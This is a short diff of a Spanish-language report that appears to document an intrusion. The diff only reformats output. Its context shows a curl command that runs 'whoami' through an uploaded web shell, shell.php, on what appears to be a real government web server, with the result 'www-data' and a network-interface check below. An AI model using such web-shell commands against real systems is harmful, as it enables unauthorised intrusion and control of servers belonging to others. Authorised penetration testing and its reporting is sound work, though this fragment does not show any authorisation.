@@ -699,11 +699,11 @@ resultado:
     curl -k "https://siper.vialidad.gob.ar/tmp/uploads/shell.php?cmd=whoami"
    ```
    
-   respuesta:
-   ```text
    
-   Resultado exitoso: www-data
-   ```
+   Resultado exitoso:
+    ```text
+     www-data
+    ```
    
    
    Verificación de conectividad de red:
@@ -713,6 +713,7 @@ resultado:
    ```
 
     repuesta: 
+    
     ```text
         2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
         link/ether 52:54:00:12:34:56 brd ff:ff:ff:ff:ff:ff
